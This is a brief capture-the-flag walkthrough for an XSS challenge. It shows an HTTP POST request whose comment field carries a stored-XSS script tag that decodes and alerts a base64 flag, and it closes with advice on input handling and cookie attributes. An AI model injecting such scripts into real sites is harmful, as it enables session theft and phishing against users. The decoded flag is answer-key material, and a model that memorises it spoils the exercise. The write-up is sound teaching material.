# 11. XSS - Merry XSSMas

## Solution:

- This walkthrough teaches us about XSS attacks, which work by injecting some code, generally javascript in input fields.
- We inject a payload like the following:
  ```
  POST /post/comment HTTP/1.1
  Host: tgm.review-your-gifts.thm

  postId=3
  name=Tony Baritone
  email=tony@normal-person-i-swear.net
  comment=<script>alert(atob("VEhNe0V2aWxfU3RvcmVkX0VnZ30="))</script> + "This gift set my carpet on fire but my kid loved it!" 
  ```
- Injecting this payload in the message and comment sections enables us to get the flags for this challenge.
- In the above payload, it looks like a normal one at first, except for the part enclosed in <script> </script> in the comment, which loads up a script in the input field where it is not intended to be, which enables attackers to gain session cookies, trigger fake login popups, and deface the page.
- Pages can be protected from XSS by treating all input as pure text, and set session cookies with HttpOnly, Secure and SameSite attributes.
